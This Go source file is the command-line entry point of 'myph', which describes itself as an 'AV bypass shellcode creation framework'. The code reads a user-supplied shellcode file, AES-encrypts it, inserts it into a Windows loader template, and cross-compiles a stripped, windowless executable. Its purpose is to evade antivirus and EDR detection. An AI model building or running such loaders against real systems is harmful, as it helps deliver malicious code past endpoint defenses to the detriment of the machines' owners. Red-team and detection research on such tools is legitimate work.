package cli

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/spf13/cobra"

	"github.com/cmepw/myph/loader"
)

func GetParser(opts *Options) *cobra.Command {
    version := "0.0.1"
    var cmd = &cobra.Command{
        Use: "myph",
        Version: version,
        DisableSuggestions : true,
        Short: "AV bypass shellcode creation framework",
        Long: `CLI to prepare your shellcode and do AV/EDR bypass`,
        Run: func(cmd *cobra.Command, args []string) {

            if opts.ShellcodePath == "" {
                fmt.Println("[!] Please specify your shellcode's path with -s")
                os.Exit(1)
            }

            plaintext_payload, err := loader.ReadFile(opts.ShellcodePath); if err != nil {
                fmt.Printf("[!] Read shellcode error: %s\n", err.Error())
                os.Exit(1)
            }

            payload := loader.Encrypt(opts.AesKey, plaintext_payload)
            s := loader.Shellcode{
                Payload: payload,
                Filename: opts.Outfile,
                AesKey: []byte(opts.AesKey),
            }

            toCompile := loader.LoadWindowsTemplate(s)
            err  = loader.WriteToTempfile(toCompile); if err != nil {
                fmt.Printf("Write error: %s\n", err.Error())
                os.Exit(1)
            }

            os.Setenv("GOOS", "windows")

            /* run compilation */
            err = exec.Command(
                "go",
                "build",
                "-ldflags",
                "-s -w -H=windowsgui",
                "-o",
                s.Filename,
                "tmp.go",
            ).Run(); if err != nil {
                println("[!] Compile error: " + err.Error())
                return
            }

            os.Remove("tmp.go")
        },
    }

    defaults := GetDefaultCLIOptions()

    cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "o", defaults.Outfile, "output filepath")
    cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
    cmd.PersistentFlags().BytesHexVarP(&opts.AesKey, "aes-key", "a", defaults.AesKey, "AES key for shellcode encryption")

    return cmd
}
